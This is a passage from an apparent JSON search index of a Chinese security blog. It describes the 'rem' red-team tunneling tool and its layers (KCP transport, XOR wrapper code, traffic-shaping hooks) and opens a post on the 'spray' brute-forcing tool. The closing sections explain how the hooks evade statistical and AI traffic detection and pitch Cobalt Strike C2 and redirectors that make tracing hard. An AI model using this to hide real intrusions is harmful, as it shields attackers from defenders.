\u76f8\u5bf9\u8f7b\u91cf\u7684ARQ\u534f\u8bae\uff0c\u539f\u751f\u5b9e\u73b0\u867d\u7136\u5bf9PacketConn\u505a\u4e86\u4e00\u5b9a\u62bd\u8c61\uff0c \u4f46\u662f\u53ea\u652f\u6301UDP</li> <li>quic-go\uff0c google\u8bbe\u8ba1\u7684ARQ\u534f\u8bae\uff0c \u73b0\u5728\u5df2\u7ecf\u6539\u540dhttp3\uff0c \u5b9e\u73b0\u4e86\u975e\u5e38\u591a\u7684\u7279\u6027\uff0c\u4f46\u662f\u4e5f\u76f8\u5bf9\u7b28\u91cd</li> <li>...</li> </ul> <p>rem\u9009\u62e9\u76f8\u5bf9\u8f7b\u91cf\u7684kcp\u4f5c\u4e3arem\u7684\u9ed8\u8ba4ARQ\u534f\u8bae\uff08ARQ\u534f\u8bae\u4e5f\u4f1a\u5f15\u5165\u65b0\u7684\u7279\u5f81\uff09\u3002\u5e76\u4e14\u57fa\u4e8ekcp-go\u8fdb\u884c\u4e86\u91cd\u6784\uff0c \u5c06\u5176\u539f\u672c\u5bf9UDP\u7684\u8026\u5408\u89e3\u8026\uff0c \u4efb\u610f\u5b9e\u73b0\u4e86PacketConn\u63a5\u53e3\u7684\u6570\u636e\u4ea4\u6362\u90fd\u53ef\u4ee5\u88abKCP\u5c01\u88c5\u4e3a\u53ef\u9760\u7684Conn\u3002 \u5e76\u4ea4\u4ed8\u7ed9\u4e0a\u5c42\u7684tunnel\u3002</p> <p>\u901a\u8fc7KCP\uff0c \u5c06golang\u539f\u672c\u5c31\u652f\u6301\u7684icmp/udp\u5c01\u88c5\u4e3a\u4e86\u53ef\u9760\u7684tunnel\uff0c \u4f46\u5230\u8fd9\u91cc\u8fd8\u6ca1\u5b8c\u3002 </p> <p>\u6700\u7ec8\u7684\u6210\u679c\u4f4d\u4e8e: https://github.com/chainreactors/rem-community/tree/master/x/kcp</p>"},{"location":"blog/2025/04/13/rem-introduce/#lolc2","title":"lolc2","text":"<p>lolc2\u4e0e loldrive , lolbas \u7c7b\u4f3c, \u901a\u8fc7\u53ef\u4fe1\u7684\u670d\u52a1\u642d\u5efa\u81ea\u5df1\u7684\u96a7\u9053\u3002</p> <p>\u8fd9\u4e9b\u670d\u52a1\u901a\u5e38\u90fd\u662f\u901a\u8fc7\u63d0\u4f9bapi\u5b9e\u73b0\u901a\u8baf, \u4e5f\u5c31\u662fhttp\u534f\u8bae. \u4f46\u8fd9\u91cc\u6709\u4e2a\u95ee\u9898, \u8fd9\u4e9b\u670d\u52a1\u7684\u8bfb/\u5199\u901a\u5e38\u662f\u4e0d\u540c\u7684\u63a5\u53e3, \u5e76\u4e14\u90fd\u662f\u5355\u4e2a\u6570\u636e\u5305\uff0c \u800c\u975e\u6d41\u5f0f\u4f20\u8f93. </p> <p>\u6240\u4ee5\u5bf9\u4e8e\u5355\u5de5\u4fe1\u9053\uff08simplex\uff09\uff0c\u4f8b\u5982http\u534f\u8bae\uff0c\u6216\u8005\u57fa\u4e8e\u5404\u79cdapi\u7684\u6570\u636e\u4ea4\u6362\u4fe1\u9053\u3002 \u8fd8\u9700\u8981\u4e00\u5c42\u5c01\u88c5\u3002 </p> <p>http\u534f\u8bae\u53ea\u5141\u8bb8\u5355\u5411\u53d1\u8d77\u8bf7\u6c42\uff0c \u56e0\u6b64\u8981\u8ba9\u6570\u636e\u80fd\u5373\u65f6\u4eceserver\u4f20\u8f93\u7ed9client\uff0c \u5fc5\u987b\u901a\u8fc7client\u53d1\u8d77\u8f6e\u8be2\u3002\u5e76\u4e14\u8f6e\u8be2\u7684\u95f4\u9694\u5c31\u662f\u8fde\u63a5\u7684\u6700\u5c0fRTT(\u5f80\u8fd4\u65f6\u95f4)\u3002\u6211\u4eec\u9700\u8981\u975eserver\u548cclient\u5206\u522b\u5b9e\u73b0\u4e0d\u540c\u7684ReadFrom\u548cWriteTo\u624d\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u5e94\u7684\u6570\u636e\u4ea4\u6362\uff0c \u5e76\u4ea4\u4ed8\u7ed9\u4e0a\u5c42\u7684tunnel\u3002</p> <p>\u8fd9\u4e48\u505a\u6027\u80fd\u53ef\u80fd\u662f\u4e2a\u5f88\u5927\u95ee\u9898, \u7528\u6765C2\u901a\u8baf\u4e00\u822c\u662f\u591f\u7528, \u7528\u6765\u6784\u5efa\u5404\u79cd\u4ee3\u7406\u4f1a\u6bd4\u8f83\u53d7\u9650.</p> <p>\u5f53\u7136\u4e5f\u6709\u4e0d\u5c11\u4e1a\u52a1\u5b58\u5728\u6d41\u5f0f\u4f20\u8f93\u7684\u529f\u80fd, \u4f8b\u5982\u89c6\u9891\u6d41, \u6587\u4ef6\u6d41\u7b49, \u5728\u5b9e\u73b0\u4e0a\u662f\u7c7b\u4f3c\u7684. </p> <p>\u5982\u679c\u662f\u5355\u4e2a\u6570\u636e\u5305\u7684api, \u901a\u8fc7\u8f6e\u8be2\u6a21\u62df\u8fde\u63a5, \u6d41\u5f0f\u4f20\u8f93\u5219\u76f4\u63a5\u4f5c\u4e3aReadWriteClose\u5373\u53ef. </p>"},{"location":"blog/2025/04/13/rem-introduce/#\u4f20\u8f93\u5c42\u4e4b\u4e0a","title":"\u4f20\u8f93\u5c42\u4e4b\u4e0a","text":"<p>\u5728\u4f20\u8f93\u5c42\u4e4b\u4e0a\uff0cOSI\u6a21\u578b\u4e2d\u662f\u4f1a\u8bdd\u5c42\uff0c \u8868\u793a\u5c42\uff0c \u548c\u5e94\u7528\u5c42\uff0c \u5206\u522b\u5bf9\u5e94\u5230rem\u5c31\u662fmux(\u94fe\u63a5\u590d\u7528)\u5c42\uff0c\u52a0\u5bc6\u6df7\u6dc6\u5c42\uff0c\u5e94\u7528\u5c42\u3002</p> <p>\u5728golang\u4e2d\uff0c \u5df2\u7ecf\u6709\u5f88\u591a\u4e2a\u6210\u719f\u7684\u591a\u8def\u590d\u7528(connection multiplexing)\u5b9e\u73b0\uff0c \u4f8b\u5982smux\u548cyamux\u3002 \u4f46\u8fd9\u548carq\u534f\u8bae\u4e00\u6837\uff0c\u4f1a\u5f15\u5165\u65b0\u7684\u7279\u5f81\uff0c\u5e76\u4e14\u4e0d\u662f\u6240\u6709\u7684\u60c5\u51b5\u90fd\u9002\u5408\u591a\u8def\u590d\u7528\u5668\u5de5\u4f5c\uff0c \u4f8b\u5982\u4f7f\u7528http\u8fd9\u7c7b\u5355\u5de5\u534f\u8bae\u6a21\u62df\u6d41\u65f6\uff0c smux\u7684\u63a7\u5236\u5c0f\u5305\u4f1a\u5e26\u6765\u989d\u5916\u7684\u4f20\u8f93\u5ef6\u8fdf\u3002 \u6240\u4ee5rem\u5b9e\u73b0\u4e86\u4e00\u4e2a\u81ea\u5df1\u7684\u591a\u8def\u590d\u7528\u5668\u3002\u8fd9\u4e2a\u591a\u8def\u590d\u7528\u5668\u5de5\u4f5c\u5728wrapper(\u540e\u9762\u4f1a\u63d0\u5230)\u4e4b\u4e0a\u3002</p> <p>wrapper\u5219\u662f\u4ee3\u66ff\u539f\u672cOSI\u6a21\u578b\u4e2d\u7684\u8868\u793a\u5c42\uff0ctunnel\u4f20\u8f93\u7684\u6570\u636e\u5c06\u4f1a\u7ecf\u8fc7wrapper\u7684\u5305\u88c5\u3002</p> <p>wrapper\u672c\u8d28\u4e0a\u662f io.ReadWriteCloser \uff0c\u662f\u9762\u5411\u6d41\u7684\u6570\u636e\u5904\u7406\u534f\u8bae\u3002wrapper\u5c06\u4f1a\u5305\u88c5tunnel\u63d0\u4f9b\u7684net.Conn\u63a5\u53e3, \u7136\u5c06\u88abwrapper\u540e\u7684Conn\u4ea4\u4ed8\u7ed9mux\uff0c \u518d\u7531mux\u4ea4\u4ed8\u7ed9\u5e94\u7528\u5c42\u3002 </p> <p>\u4e00\u4e2a\u57fa\u4e8exor\u5b9e\u73b0\u7684wrapper\u53ea\u9700\u8981\u5b9e\u73b0\u7b80\u5355\u7684Read\u548cWrite\u63a5\u53e3\u5373\u53ef\u5c06\u6570\u636e\u8fdb\u884c\u7b80\u5355\u7684\u52a0\u5bc6:</p> <pre><code>func NewXorWrapper(r io.Reader, w io.Writer, opt map[string]string) core.Wrapper {  \n    var key []byte  \n    if k, ok := opt[\"key\"]; ok {  \n       key = []byte(k)  \n    } else {  \n       key = []byte{} // \u4f7f\u7528\u7a7a\u5b57\u8282\u5207\u7247\u4f5c\u4e3a\u9ed8\u8ba4\u503c  \n    }  \n\n    var iv []byte  \n    if i, ok := opt[\"iv\"]; ok {  \n       iv = []byte(i)  \n    } else {  \n       iv = key // \u5982\u679c\u6ca1\u6709\u63d0\u4f9biv\uff0c\u4f7f\u7528key\u4f5c\u4e3aiv  \n    }  \n\n    encryptor := utils.NewXorEncryptor(key, iv)  \n    return &amp;XorWrapper{  \n       reader:    &amp;cipher.StreamReader{S: encryptor.GetStream(), R: r},  \n       writer:    &amp;cipher.StreamWriter{S: encryptor.GetStream(), W: w},  \n       encryptor: encryptor,  \n    }  \n}  \n\nfunc (w *XorWrapper) Name() string {  \n    return consts.XORWrapper  \n}  \n\nfunc (w *XorWrapper) Read(p []byte) (n int, err error) {  \n    return w.reader.Read(p)  \n}  \n\nfunc (w *XorWrapper) Write(p []byte) (n int, err error) {  \n    return w.writer.Write(p)  \n}  \n\nfunc (w *XorWrapper) Close() error {  \n    return w.encryptor.Reset()  \n}\n</code></pre> <p>\u4f46\u5bf9\u4e8e\u975e\u6d41\u5f0f\u7684\u52a0\u5bc6\u6df7\u6dc6\u534f\u8bae\uff0c \u4f1a\u7a0d\u5fae\u9ebb\u70e6\u4e00\u70b9\uff0c \u6211\u4eec\u9700\u8981\u5728wrapper\u4e2d\u6dfb\u52a0\u7f13\u51b2\u533a\uff0c \u5c06\u9700\u8981\u7684\u6570\u636e\u8bfb\u5230\u7f13\u51b2\u533a\u540e\u8fdb\u884c\u7279\u5b9a\u7684\u64cd\u4f5c\u518d\u4ea4\u4ed8\u7ed9\u4e0a\u5c42\u3002\uff08\u8fd9\u6837\u7684\u5b9e\u73b0\u53ef\u80fd\u5728\u4e00\u5b9a\u5c42\u5ea6\u4e0a\u4f1a\u5f71\u54cd\u6027\u80fd\uff09</p> <p>\u6700\u7ec8\uff0c \u8fd8\u53ef\u4ee5\u5c06\u591a\u4e2awrapper\u8fde\u63a5\u5728\u4e00\u8d77\uff0c \u5c06\u6570\u636e\u8fdb\u884c\u590d\u6742\u7684\u52a0\u5bc6\u6df7\u6dc6\u64cd\u4f5c\u3002 </p> <p>\u5728rem\u4e2d\uff0c \u4f1a\u8bdd\u5c42\u548c\u8868\u793a\u5c42\u662f\u5012\u7f6e\u7684\u3002 \u4f1a\u8bdd\u5c42\u627f\u8f7d\u5728\u8868\u793a\u5c42\u4e4b\u4e0a\u3002 </p>"},{"location":"blog/2025/04/13/rem-introduce/#\u4f20\u8f93\u5c42\u4e4b\u95f4","title":"\u4f20\u8f93\u5c42\u4e4b\u95f4","text":"<p>rem\u662f\u5728\u4f20\u8f93\u5c42\u4e4b\u4e0a\u91cd\u65b0\u6784\u5efa\u7684\u4e00\u6574\u5957\u7f51\u7edc\u67b6\u6784\u3002 \u5bf9\u4e8e\u5e95\u5c42\u7684\u4ea4\u6362\u8def\u7531\u8bbe\u5907\uff0crem\u4e0d\u4f1a\u6709\u6d89\u53ca\uff0c \u4f46\u662f\u539f\u672c\u7684\u7f51\u7edc\u4e2d\uff0c \u5c31\u6709\u5404\u79cd\u5404\u6837\u7684\u5e94\u7528\u5c42\u4ee3\u7406\uff0c\u4f8b\u5982http\uff0csocks5\uff0cssh\u7b49\u5404\u79cd\u5404\u6837\u7684\u4ee3\u7406\u534f\u8bae\uff0c \u4ee5\u53ca\u5728\u5b89\u5168\u4e2d\u5e38\u7528\u7684neoreg\uff0csuo5\u7b49webshell\u5b9e\u73b0\u7684\u4ee3\u7406\u534f\u8bae\u3002 </p> <p>\u4e3a\u4e86\u8ba9rem\u80fd\u4e0e\u5916\u90e8\u7684\u4ee3\u7406\u534f\u8bae\u6709\u4ea4\u4e92\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u5728\u5404\u4e2a\u5c42\u9762\u4e0a\u5141\u8bb8rem\u901a\u8fc7\u539f\u672c\u5c31\u5b58\u5728\u7684\u4ee3\u7406\u534f\u8bae\u642d\u5efa\u4fe1\u9053\uff08\u901a\u5e38\u7528\u5728\u5404\u79cd\u4e0d\u51fa\u7f51\u6216\u8005\u9650\u5236\u51fa\u7f51\u573a\u666f\u4e0b\uff09\u3002</p> <p>rem\u9700\u8981\u8ba9tunnel\uff0coutbound\u7b49\u5404\u79cd\u573a\u666f\u90fd\u652f\u6301\u4e0a\u57fa\u4e8e\u539f\u672c\u7684\u4ee3\u7406\u534f\u8bae\u5b9e\u73b0\u6570\u636e\u4f20\u8f93\u3002 </p> <p>\u5728\u7279\u522b\u65e9\u671f\u7248\u672c\u627e\u5230\u4e86 https://github.com/zhuhaow/ProxyClient \u8fd9\u4e2a\u5e93\uff0c \u4f46\u56e0\u4e3a\u4ee3\u7801\u4e4b\u7c7b\u8f83\u4f4e\u53c8\u66ff\u6362\u4e3a\u4e86 https://github.com/missdeer/ProxyClient \u3002\u7ed3\u679c\u65b0\u7684\u8fd9\u4e2a\u5e93\u5728\u6bcf\u4e2a\u534f\u8bae\u4e0a\u90fd\u5b58\u5728bug\u3002 </p> <p>\u6700\u540e\u57fa\u4e8e https://github.com/missdeer/ProxyClient \u91cd\u6784\u5e76\u4fee\u590d\u4e86\u5927\u91cf\u7684bug, \u624d\u80fd\u8ba9rem\u5de5\u4f5c\u5728\u5404\u79cd\u4ee3\u7406\u534f\u8bae\u4e0a\u3002 </p> <p>\u6700\u7ec8\u7684\u6210\u679c\u4f4d\u4e8e: https://github.com/chainreactors/proxyclient</p>"},{"location":"blog/2025/04/13/rem-introduce/#\u4f20\u8f93\u5c42\u4e4b\u5916","title":"\u4f20\u8f93\u5c42\u4e4b\u5916","text":"<p>\u73b0\u4ee3\u7684\u6d41\u91cf\u68c0\u6d4b\u8bbe\u5907\uff0c \u9664\u4e86\u7279\u5f81\u68c0\u6d4b\u4e4b\u5916\uff0c \u8fd8\u4f1a\u6709\u5927\u6570\u636e\uff0c \u7edf\u8ba1\u5b66\uff0c AI\u4e4b\u7c7b\u7684\u5bf9\u6297\u7ef4\u5ea6\u3002 \u6211\u4eec\u521a\u521a\u6784\u5efa\u7684\u4f20\u8f93\u5c42\u672c\u8d28\u4e0a\u53ea\u89e3\u51b3\u4e86\u7279\u5f81\u68c0\u6d4b\u548c\u5bc6\u7801\u5b66\u5b89\u5168\u7684\u95ee\u9898\u3002 \u5bf9\u4e8e\u8fd9\u4e9b\u65b0\u7684\u68c0\u6d4b\u7ef4\u5ea6\uff0c \u6211\u4eec\u4e5f\u9700\u8981\u65b0\u7684\u624b\u6bb5\u3002 </p> <p>rem\u8fd8\u63d0\u4f9b\u4e86\u4e00\u7ec4\u63a5\u53e3\uff0c \u80fd\u8ba9\u7528\u6237\u5bf9\u6570\u636e\u8fdb\u884c\u7edf\u8ba1\u5b66\u5c42\u9762\u7684\u64cd\u4f5c\u3002 </p> <pre><code>type BeforeHook struct {  \n    DialHook   func(ctx context.Context, addr string) context.Context  \n    AcceptHook func(ctx context.Context) context.Context  \n    ListenHook func(ctx context.Context, addr string) context.Context  \n}  \n\ntype AfterHookFunc func(ctx context.Context, c net.Conn, addr string) (context.Context, net.Conn, error)  \n\ntype AfterHook struct {  \n    Priority   uint  \n    DialerHook func(ctx context.Context, c net.Conn, addr string) (context.Context, net.Conn, error)  \n    AcceptHook func(ctx context.Context, c net.Conn) (context.Context, net.Conn, error)  \n    ListenHook func(ctx context.Context, listener net.Listener) (context.Context, net.Listener, error)  \n}\n</code></pre> <p>after\u548cbefore hook\u80fd\u5728tunnel dial/accept\u524d\u540e\u5b9e\u73b0\u7279\u5b9a\u7684\u64cd\u4f5c\u3002 \u4f8b\u5982\u6dfb\u52a0\u968f\u673a\u7684 \u5ef6\u8fdf/\u6d41\u91cf\u63a7\u5236/\u538b\u7f29/\u968f\u673a\u586b\u5145 \u7b49\u7b49\u64cd\u4f5c\uff0c \u6765\u89c4\u907f\u7edf\u8ba1\u5b66\u548c\u5927\u6570\u636e\u4e0a\u7684\u68c0\u6d4b\u3002 \uff08\u987a\u5e26\u4e00\u63d0\uff0c wrapper\u4e5f\u662f\u57fa\u4e8ehook\u5b9e\u73b0\u7684\uff09\u3002\u751a\u81f3\u66f4\u8fdb\u4e00\u6b65\uff0c \u6211\u4eec\u53ef\u4ee5\u72ec\u7acb\u63a7\u5236\u4e0a\u4e0b\u884c\u7684\u6570\u636e\u7279\u5f81\uff0c \u53bb\u6a21\u62df\u4efb\u610f\u6570\u636e\u4f20\u8f93\u7684\u7279\u6027\u3002 </p>"},{"location":"blog/2025/04/13/rem-introduce/#\u5e94\u7528\u5c42","title":"\u5e94\u7528\u5c42","text":"<p>\u4e4b\u524d\u63d0\u5230\u8fc7rem\u4e4b\u95f4\u5e76\u4e0d\u5206server\u548cclient\uff0c\u53ea\u6709tunnel\u6709\u903b\u8f91\u610f\u4e49\u4e0a\u7684server\u548cclient\uff0c \u6700\u7ec8\u7684\u539f\u56e0\u5c31\u662f\u6211\u4eec\u901a\u8fc7inbound/outbound\u6765\u63a7\u5236\u6d41\u91cf\u7684\u65b9\u5411\uff0c \u800cinbound/outbound \u65e2\u53ef\u4ee5\u642d\u5efa\u5728tunnel\u7684server\u4e0a\u4e5f\u53ef\u4ee5\u662fclient\u4e0a\u3002 </p> <p>inbound\u662f\u6570\u636e\u5165\u53e3\uff0c outbound\u662f\u6570\u636e\u51fa\u53e3\u3002 \u7528\u6237\u7684\u6570\u636e\u4eceinbound\u7ecf\u8fc7tunnel\u5230outbound\u5bf9\u5916\u53d1\u8d77\u8bf7\u6c42\u3002</p> <p>\u5927\u591a\u6570\u573a\u666f\u4e0b\uff0c \u6211\u4eec\u53ea\u4f1a\u7528\u5230\u53cd\u5411\u4ee3\u7406\uff0c\u7531\u5916\u7f51\u8bbf\u95ee\u5230\u76ee\u6807\u5185\u7f51\u3002</p> <p>\u4f46\u662f\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u505a\u7684\u66f4\u591a\uff0c \u6211\u4eec\u53ea\u9700\u8981\u5b9e\u73b0\u4e00\u4e2a\u7b26\u5408cobaltstrike\u7684external c2 \u534f\u8bae\u7684inbound\uff0c \u6211\u4eec\u5c31\u53ef\u4ee5\u8ba9cobaltstrike\u7684\u6d41\u91cf\u8d70\u5230rem\u6784\u5efa\u7684\u7f51\u7edc\u4e2d\u3002 </p> <p>\u518d\u8fdb\u4e00\u6b65\uff0c \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7tun/tap\u865a\u62df\u7f51\u5361\uff0c\u771f\u6b63\u610f\u4e49\u4e0a\u5c06\u76ee\u6807\u548c\u672c\u5730\u7684\u7f51\u7edc\u8fde\u4e3a\u4e00\u4f53\u3002</p> <p>\u66f4\u751a\u81f3\uff0c \u901a\u8fc7STUN\u534f\u8bae\uff0c \u5b9e\u73b0p2p\u7684\u7f51\u7edc\u901a\u8baf\u3002</p> <p>\u8fd9\u4e00\u5207\uff0c \u90fd\u53ef\u4ee5\u5728rem\u7684\u80fd\u529b\u8986\u76d6\u8303\u56f4\u4e4b\u5185\u3002 </p>"},{"location":"blog/2025/04/13/rem-introduce/#\u5c0f\u7ed3","title":"\u5c0f\u7ed3","text":"<p>\u770b\u5230\u8fd9\u91cc\u53ef\u4ee5\u53d1\u73b0,  rem\u57fa\u4e8e\u4f20\u8f93\u5c42\u4e4b\u4e0a\u91cd\u65b0\u62bd\u8c61\u4e86\u6574\u4e2a\u7f51\u7edc\u4ea4\u4e92\u7684\u6d41\u7a0b\u3002</p> <ul> <li>\u4f20\u8f93\u5c42, \u5bf9\u5e94 core/tunnel, \u5206\u4e3a listener \u548c dialer, \u53ef\u4ee5\u5b9e\u73b0\u81ea\u5b9a\u4e49\u7684\u4efb\u610f\u4f20\u8f93\u5c42\u4fe1\u9053\uff0c \u53ea\u9700\u8981\u5b9e\u73b0\u5bf9\u5e94\u7684 golang \u7684\u63a5\u53e3\u5373\u53ef\u3002\u76ee\u524d\u5b9e\u73b0\u4e86\uff0ctcp, udp, icmp, websocket.</li> <li>\u4f1a\u8bdd\u5c42, \u5b9e\u73b0\u4e86\u94fe\u63a5\u590d\u7528(mux)\u548cagent\u7ba1\u7406.</li> <li>\u52a0\u5bc6\u6df7\u6dc6\u5c42(\u5bf9\u5e94\u8868\u793a\u5c42)\uff0c\u5bf9\u5e94 core/wrapper\uff0c\u5bf9\u5e94\u7684\u63a5\u53e3\u662f ReadWriteCloser, \u53ea\u9700\u8981\u5b9e\u73b0\u5bf9\u5e94\u7684 Read \u548c Writer \u63a5\u53e3\uff0c \u5373\u53ef\u5b9e\u73b0\u5bf9\u4f20\u8f93\u5c42\u6d41\u7a0b\u7684\u52a0\u5bc6\uff0c\u6df7\u6dc6\uff0c \u4f2a\u88c5\u3002\u751a\u81f3\u53ef\u4ee5\u5b9e\u73b0\u4e0a\u4e0b\u884c\u6d41\u91cf\u5206\u522b\u914d\u7f6e\u4e0d\u540c\u7684 wrapper. \u76ee\u524d\u5b9e\u73b0\u4e86 aes, xor, padding.</li> <li>\u4e2d\u8f6c/\u4ee3\u7406\u5c42(\u5bf9\u5e94\u8868\u793a\u5c42) (\u53ef\u9009), \u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e09\u65b9\u4ee3\u7406/\u670d\u52a1\u4e2d\u8f6c\u6d41\u91cf\uff0c \u4f8b\u5982\u901a\u8fc7 ssh, socks5, http, neoreg, suo5 \u7b49\u4efb\u610f\u5177\u6709\u6d41\u91cf\u529f\u80fd\u7684\u5b9e\u73b0\u6570\u636e\u8f6c\u53d1</li> <li>\u5e94\u7528\u5c42, \u57fa\u4e8e\u4e0a\u9762\u4e09\u5c42\u5b9e\u73b0\u7684\u4fe1\u9053, \u53ef\u4ee5\u88ab\u5c01\u88c5\u4e3a\u4e0d\u540c\u7684\u5e94\u7528, \u76ee\u524d\u5b9e\u73b0\u4e86 socks5, port forward, http \u4ee3\u7406, shadowsocks, trojan\u7b49</li> </ul> <p>\u57fa\u4e8e\u8fd9\u6837\u7684\u62bd\u8c61\u5c42\u7ea7, \u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u62d3\u5c55 rem \u7684\u80fd\u529b\u8fb9\u754c\u3002 \u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u6dfb\u52a0\u4e00\u4e2a\u4f20\u8f93\u5c42\u534f\u8bae\uff0c \u6216\u662f\u52a0\u5bc6\u6df7\u6dc6\u7b97\u6cd5\uff0c \u6216\u662f\u4ee3\u7406\u4e2d\u8f6c\u5de5\u5177\uff0c \u53c8\u6216\u662f\u6700\u7ec8\u9762\u5411\u7528\u6237\u7684\u534f\u8bae\u3002</p> <p>\u8fd9\u662f\u524d\u6240\u672a\u6709\u7684\u6f5c\u529b\uff0c\u6211\u4eec\u53ef\u4ee5\u505a\u975e\u5e38\u591a\u4e8b\u60c5, \u4e4b\u524d\u65e0\u6cd5\u60f3\u8c61\u7684\u4e8b\u60c5\uff01 \u4e3e\u51e0\u4e2a\u4f8b\u5b50:</p> <ul> <li>\u53ef\u4ee5\u5b9e\u73b0 cobaltstrike externalC2\u7684\u5e94\u7528\u5c42\u534f\u8bae, \u8ba9CS\u7684\u6d41\u91cf\u8d70rem\u6784\u5efa\u7684\u4fe1\u9053\u4e2d</li> <li>\u53ef\u4ee5\u4f5c\u4e3acobaltstrike\u7684\u524d\u7f6eRedirector, \u8ba9\u6eaf\u6e90\u53d8\u5f97\u56f0\u96be\u91cd\u91cd</li> <li>\u53ef\u4ee5\u5355\u72ec\u5b9e\u73b0\u4e0a\u884c\u4e0e\u4e0b\u884c\u534f\u8bae\u7684\u7279\u5f81, \u5728\u6d41\u91cf\u5c42\u9762\u4e0a\u6a21\u62df\u5df2\u77e5\u534f\u8bae</li> <li>\u53ef\u4ee5\u901a\u8fc7tun\u5c06\u76ee\u6807\u7f51\u7edc\u8fde\u6210\u4e00\u7247, \u5ffd\u7565\u6240\u6709\u5f62\u5f0f\u7684\u7f51\u7edc\u9694\u79bb</li> <li>\u7f16\u8bd1\u4e3aWASM, \u76f4\u63a5\u901a\u8fc7\u6d4f\u89c8\u5668\u63d0\u4f9b\u7684XHR\u63a5\u53e3\u642d\u5efa\u4ee3\u7406</li> <li>......</li> </ul>"},{"location":"blog/2025/04/13/rem-introduce/#end","title":"End","text":"<p>rem \u662fredboot\u8ba1\u5212\u4e2d\u4e09\u5927\u8def\u7ebf\u4e4b\u4e8c, \u76ee\u524d\u53ea\u6709\u9762\u5411\u7ea2\u961f\u7684\u9ad8\u4ea4\u4e92\u7684\u534a\u81ea\u52a8ASM--- mapping\u8fd8\u6ca1\u6709\u53d1\u5e03\uff0c \u53d7\u9650\u4e8e\u7cbe\u529b\u4e5f\u65e0\u6cd5\u5728\u77ed\u671f\u53d1\u5e03\u3002 </p> <p>rem\u4e3b\u8981\u89e3\u51b3\u7684\u95ee\u9898\u5c31\u662f\u5728\u5404\u79cd\u573a\u666f\u4e2d\u7684tunnel/proxy\u95ee\u9898\uff0c \u5e76\u4e14\u4f5c\u4e3a\u4e32\u8054\u5176\u4ed6\u5de5\u5177\u7684\u4e2d\u95f4\u4ef6\u4f7f\u7528. </p> <p>IoM \u53ef\u4ee5\u901a\u8fc7rem\u642d\u5efa\u4ee3\u7406\uff0c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u57fa\u4e8erem\u6784\u5efa\u4fe1\u9053.  \u66f4\u53ef\u4ee5\u642d\u5efa\u57fa\u4e8erem\u7684listener.</p> <p>\u5173\u4e8eIoM\u7684rem\u76f8\u5173\u529f\u80fd\u4ee5\u53ca\u5728IoM v0.1.0\u4e2d\u63a5\u5165\uff0c \u53ef\u4ee5\u4f53\u9a8c\u5230\u4ee3\u7406\u5de5\u5177\u4e0eIoM\u7684\u65e0\u7f1d\u63a5\u5165\u3002 https://chainreactors.github.io/wiki/blog/2025/04/14/IoM_v0.0.5/#rem</p> <p>mapping\u53ef\u4ee5\u901a\u8fc7rem\u5c06\u5176\u7684\u80fd\u529b\u62d3\u5c55\u5230\u5185\u7f51\u6216\u8005\u4f7f\u7528rem\u6784\u5efa\u5206\u5e03\u5f0f\u626b\u63cf\u96c6\u7fa4. </p> <p>rem\u662f\u6574\u4e2a\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd\u4e2d\u91cd\u8981\u7684\u4e00\u73af, \u6211\u76f8\u4fe1\u5b83\u80fd\u627f\u62c5\u653b\u9632\u573a\u666f\u4e2d\u66f4\u591a\u7684\u7f51\u7edc\u4fa7\u529f\u80fd\uff0c\u7ed9\u6574\u4e2a\u751f\u6001\u5e26\u6765\u53d8\u5316\u3002</p>"},{"location":"blog/2024/08/25/spray-best-practices/","title":"\u76ee\u5f55\u7206\u7834\u4e0e\u6307\u7eb9\u8bc6\u522b\u7684\u6700\u4f73\u5b9e\u8df5","text":"<p>\u672c\u6587\u63d0\u5230\u7684\u5de5\u5177: https://github.com/chainreactors/spray</p>"},{"location":"blog/2024/08/25/spray-best-practices/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>\u4e4b\u524d\u5728 \u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u6536\u96c6URL? \u53d1\u5e03\u4e86\u4e24\u4e2a\u5de5\u5177, \u5206\u522b\u662f\u7528\u6765\u7206\u7834\u76ee\u5f55\u7684spray \u548c\u7528\u6765\u88ab\u52a8\u6536\u96c6url\u7684 urlfounder.  </p> <p>urlfounder\u5728\u53d1\u5e03\u540e\u57fa\u672c\u6ca1\u8fdb\u884c\u66f4\u65b0,  \u4f46\u662fspray\u7ecf\u8fc7\u4e00\u5e74\u7684\u8fdb\u5316, \u8fce\u6765\u4e86v1.0.0\u7248\u672c. \u5b9a\u4f4d\u4e5f\u4ece\u4e00\u4e2a\u76ee\u5f55\u7206\u7834\u5de5\u5177\u53d8\u6210\u4e86\u5168\u9762\u5168\u80fd\u7684WEB\u4fe1\u606f\u6536\u96c6\u5de5\u5177. </p> <p>\u5b83\u62e5\u6709\u76ee\u524d\u6700\u5f3a\u5927\u7684\u6027\u80fd\u4e0e\u6700\u667a\u80fd\u7684\u7b97\u6cd5. \u51e0\u4e4e\u80fd\u8986\u76d6dirsearch + httpx + \u6307\u7eb9\u8bc6\u522b(fingers) + fuff\u7684\u5168\u90e8\u529f\u80fd.</p>"},{"location":"blog/2024/08/25/spray-best-practices/#\u6700\u4f73\u5b9e\u8df5","title":"\u6700\u4f73\u5b9e\u8df5","text":"<p>\u524d\u6bb5\u65f6\u95f4, \u53d1\u5e03\u4e86\u6307\u7eb9\u8bc6\u522b\u5f15\u64cefingers(https://github.com/chainreactors/fingers), \u8fd9\u4e2a\u5f15\u64ce\u4e0d\u5305\u542b\u53d1\u5305\u80fd\u529b, \u53ea\u80fd\u4f20\u5165<code>http.Response</code>\u6216<code>bytes</code> \u8fd4\u56de\u7528\u6765\u63cf\u8ff0\u6307\u7eb9\u5168\u90e8\u4fe1\u606f\u7684<code>Frameworks</code>\u7ed3\u6784.</p> <p>\u56e0\u4e3afingers\u5728\u8bbe\u8ba1\u4e0a\u5c31\u662f\u4f5c\u4e3agogo/spray\u7684\u5e93\u4f7f\u7528, \u53d1\u5305\u80fd\u529b\u662f\u5728gogo/spray\u4e2d\u5b9e\u73b0\u7684. gogo\u575a\u6301\u6700\u5c0f\u53d1\u5305\u539f\u5219, \u653e\u5f03\u4e86\u5f88\u591a\u6307\u7eb9\u8bc6\u522b\u7684\u673a\u4f1a. 